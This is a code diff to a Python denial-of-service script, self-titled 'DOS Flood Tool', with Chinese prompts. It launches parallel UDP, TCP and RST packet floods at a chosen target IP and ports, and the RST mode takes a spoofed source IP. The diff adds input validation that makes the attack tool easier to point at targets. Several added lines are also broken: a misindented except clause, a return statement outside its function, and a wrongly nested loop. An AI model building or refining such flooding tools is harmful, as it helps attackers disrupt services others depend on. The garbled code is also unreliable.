@@ -73,27 +73,74 @@ def RST_Flood(dstIP, srcIP, Port, counter):
         total += 1
     sys.stdout.write("\nTotal packets sent: %i\n" % total)
 
-def info():
+def validate_ip(ip):
+    try:
+        parts = ip.split('.')
+        if len(parts) != 4:
+            return False        
+        for part in parts:
+            if not part.isdigit() or not 0 <= int(part) <= 255:
+                return False
+        return True
+        except:
+            return False
+def validate_port(port):
+    try:
+        return 1 <= int(port) <= 65535
+    except:
+        return False
+            
+def info():
     os.system("clear")
     print("#############################")
     print("# Welcome to DOS Flood Tool #")
     print("#############################")
-
-    dstIP = input("\nTarget IP : ")
-    normalPort = [80, 443, 25, 21, 22, 23]
-
-    return dstIP, normalPort
-  
+    while True:
+        dstIP = input("\nTarget IP : ")
+        if validate_ip(dstIP):
+            break
+        print("无效的IP地址！")
+            
+    while True:
+        port_input = input("Target Ports (1-65535): ")
+        try:
+            normalPort = [int(p.strip()) for p in port_input.split(',')]
+            if all(validate_port(p) for p in normalPort):
+                break
+            print("无效的端口号！")
+        except:
+            print("Invalid port format!")
+                            
+return dstIP, normalPort
+                            
 def info1():
     os.system("clear")
     print("#############################")
     print("# Welcome to DOS Flood Tool #")
     print("#############################")
+    
+    while True:
+        dstIP = input("\nTarget IP : ")
+        if validate_ip(dstIP):
+            break
+        print("无效的IP地址！")
+        
+    while True:
+        port_input = input("Target Ports (1-65535): ")
+        try:
+            dstPort = [int(p.strip()) for p in port_input.split(',')]
+            if all(validate_port(p) for p in dstPort):
+                break
+            print("无效的端口号！")
+        except:
+            print("Invalid port format!")
 
-    dstIP = input("\nTarget IP : ")
-    # dstPort = input("Target Port : ")
-    dstPort = [80, 53, 25, 110]
-    srcIP = input("\nsourse IP : ")
+        while True:
+            srcIP = input("\nSource IP : ")
+            if validate_ip(srcIP):
+                break
+            print("无效的IP地址！")
+            
     return dstIP, srcIP, dstPort
 
 def udp_flood_attack(dstIP, normalPort, counter):
@@ -125,23 +172,36 @@ def rst_flood_attack(dstIP, srcIP, dstPort, counter):
 
 if __name__ == '__main__':
     attack_type = input("请选择攻击方式：\n1. UDP Flood\n2. TCP Flood\n3. RST Flood\n")
-    num = input("并行数:")
-    counter = input("你需要发送多少包 : ")
+
+    while True:
+        num = input("并行数: ")
+        if num.isdigit() and int(num) > 0:
+            num = int(num)
+            break
+        print("请输入正整数！")
+
+    while True:
+        counter = input("你需要发送多少包: ")
+        if counter.isdigit() and int(counter) > 0:
+            counter = int(counter)
+            break
+        print("请输入正整数！")
+
     process_list = []
 
     if attack_type == '1':
         dstIP, normalPort = info()
-        for i in range(int(num)):
+        for i in range(num):
             p = Process(target=udp_flood_attack, args=(dstIP, normalPort, counter))
             process_list.append(p)
     elif attack_type == '2':
         dstIP, normalPort = info()
-        for i in range(int(num)):
+        for i in range(num):
             p = Process(target=tcp_flood_attack, args=(dstIP, normalPort, counter))
             process_list.append(p)
     elif attack_type == '3':
         dstIP, srcIP, dstPort = info1()
-        for i in range(int(num)):
+        for i in range(num):
             p = Process(target=rst_flood_attack, args=(dstIP, srcIP, dstPort, counter))
             process_list.append(p)
     else:
@@ -150,5 +210,6 @@ if __name__ == '__main__':
 
     for p in process_list:
         p.start()
+    
     for p in process_list:
         p.join()
